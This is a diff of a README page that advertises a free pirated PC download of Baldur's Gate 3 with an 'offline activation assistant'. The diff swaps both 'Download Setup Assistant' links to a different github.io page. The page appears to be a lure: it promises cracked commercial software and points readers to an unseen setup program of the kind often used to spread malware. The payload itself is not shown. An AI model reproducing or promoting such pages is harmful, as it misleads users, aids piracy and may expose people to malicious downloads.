@@ -1,6 +1,6 @@
 # Baldur's Gate 3 — Free Download Game For PC
 
-[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://ryadikmntiiks.github.io/.github/BG3)
+[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://baldurs-gate-3-download.github.io/.github/)
 
 ---
 
@@ -45,7 +45,7 @@ With this offline activation assistant, players can enjoy the full experience of
 
 From building relationships with companions to surviving deadly encounters in tactical turn-based combat, Baldur's Gate 3 delivers a top-tier fantasy RPG experience. Install confidently and start your journey across Faerûn with no online requirements.
 
-[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://ryadikmntiiks.github.io/.github/BG3)
+[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://baldurs-gate-3-download.github.io/.github/)
 
 ---
 
